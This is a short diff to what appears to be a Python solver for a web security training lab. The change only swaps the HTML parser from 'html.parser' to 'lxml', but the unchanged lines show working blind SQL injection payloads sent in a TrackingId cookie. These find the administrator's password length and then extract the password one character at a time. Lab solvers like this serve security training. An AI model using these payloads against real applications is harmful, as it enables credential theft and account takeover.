@@ -17,7 +17,7 @@ def solve_lab(session):
             "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND LENGTH(password)={len_pass} --"
         }
         resp = session.get_path("/", cookies=cookies)
-        soup = BeautifulSoup(resp.text, "html.parser")
+        soup = BeautifulSoup(resp.text, "lxml")
         welcome_back = soup.find(string="Welcome back!")
 
         if welcome_back is None:
@@ -42,7 +42,7 @@ def solve_lab(session):
                 "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password, {i+1}, 1)='{c}' --"
             }
             resp = session.get_path("/", cookies=cookies)
-            soup = BeautifulSoup(resp.text, "html.parser")
+            soup = BeautifulSoup(resp.text, "lxml")
             welcome_back = soup.find(string="Welcome back!")
 
             if welcome_back is None:
